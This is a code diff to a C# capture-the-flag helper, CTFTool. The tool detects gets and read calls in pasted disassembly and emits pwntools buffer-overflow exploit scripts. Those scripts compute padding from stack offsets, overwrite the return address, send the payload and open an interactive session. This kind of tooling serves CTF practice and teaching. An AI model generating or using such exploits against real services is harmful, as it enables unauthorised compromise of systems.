@@ -70,7 +70,7 @@ namespace CTFTool
             return false;
         }
 
-        //存在gets函数
+        //存在漏洞函数
         private Boolean PwnExistGets()
         {
             if (m_cIn.Text.Contains("gets"))
@@ -79,8 +79,13 @@ namespace CTFTool
                 m_cExp.Text += "函数中存在漏洞函数gets!";
 
                 //输出
-                m_cOut.Text += "from pwn import *\n";
-                m_cOut.Text += "\n";
+                m_cOut.Text += "from pwn import *\n\n";
+                m_cOut.Text += "context(os='linux', arch='amd64', log_level='debug')\n";
+                m_cOut.Text += "content = 0\n\n\n";
+                m_cOut.Text += "def main():\n";
+                m_cOut.Text += "\tif content == 1:\n";
+                m_cOut.Text += "\t\tpwn_process = process('./{NAME}')\n";
+                m_cOut.Text += "\telse:\n";
                 Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                 Match vMatch = vRegex.Match(m_cIn.Text);
                 if (vMatch.Success)
@@ -106,7 +111,7 @@ namespace CTFTool
             return false;
         }
 
-        //存在gets函数
+        //存在漏洞函数
         private Boolean PwnExistRead()
         {
             if (m_cIn.Text.Contains("read"))
@@ -115,27 +120,59 @@ namespace CTFTool
                 m_cExp.Text += "函数中存在漏洞函数read!";
 
                 //输出
-                m_cOut.Text += "from pwn import *\n";
-                m_cOut.Text += "\n";
+                #region Framework
+                m_cOut.Text += "from pwn import *\n\n";
+                m_cOut.Text += "context(os='linux', arch='amd64', log_level='debug')\n";
+                m_cOut.Text += "# context(os='linux', arch='x86', log_level='debug')\n";
+                m_cOut.Text += "content = 0\n\n\n";
+                m_cOut.Text += "def main():\n";
+                m_cOut.Text += "    if content == 1:\n";
+                m_cOut.Text += "        pwn_process = process('./{NAME}')\n";
+                m_cOut.Text += "    else:\n";
                 Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                 Match vMatch = vRegex.Match(m_cIn.Text);
                 if (vMatch.Success)
                 {
-                    m_cOut.Text += "process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
+                    m_cOut.Text += "        pwn_process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
                 }
                 else
                 {
-                    m_cOut.Text += "process = remote('IP', Port)\n";
+                    m_cOut.Text += "        pwn_process = remote('IP', Port)\n";
                 }
-                vRegex = new Regex("\\[rbp-(.*?)h\\]");
+                #endregion Framework
+                #region Payload0
+                vRegex = new Regex("unk_([0-9a-fA-F]+)");
                 vMatch = vRegex.Match(m_cIn.Text);
                 if (vMatch.Success)
                 {
-                    m_cOut.Text += "payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
-                    m_cOut.Text += "# payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
-                    m_cOut.Text += "process.sendline(payload)\n";
+                    String sAddr = "0x" + vMatch.Groups[1].Value;
+                    vRegex = new Regex("dword_([0-9a-fA-F]+)");
+                    vMatch = vRegex.Match(m_cIn.Text);
+                    if (vMatch.Success)
+                    {
+                        m_cOut.Text += "    payload = b'a' * (0x" + vMatch.Groups[1].Value + " - " + sAddr + ")\n";
+                        m_cOut.Text += "    payload = payload + p64({VALUE})\n";
+                        m_cOut.Text += "    pwn_process.recvuntil('{STRING}')\n";
+                        m_cOut.Text += "    pwn_process.sendline(payload)\n";
+                    }
                 }
-                m_cOut.Text += "process.interactive()\n";
+                #endregion Payload0
+                #region Payload1
+                vRegex = new Regex("\\[rbp-(.*?)h\\]|\\[ebp-(.*?)h\\]");
+                vMatch = vRegex.Match(m_cIn.Text);
+                if (vMatch.Success)
+                {
+                    m_cOut.Text += "    payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
+                    m_cOut.Text += "    # payload = b'A'*(0x" + vMatch.Groups[2].Value + " + 0x4) + p64(Adress)\n";
+                    m_cOut.Text += "    # payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
+                    m_cOut.Text += "    pwn_process.recvuntil('{STRING}')\n";
+                    m_cOut.Text += "    pwn_process.sendline(payload)\n";
+                }
+                #endregion Payload1
+                #region Framework
+                m_cOut.Text += "    pwn_process.interactive()\n\n\n";
+                m_cOut.Text += "main()\n";
+                #endregion Framework
 
                 return true;
             }
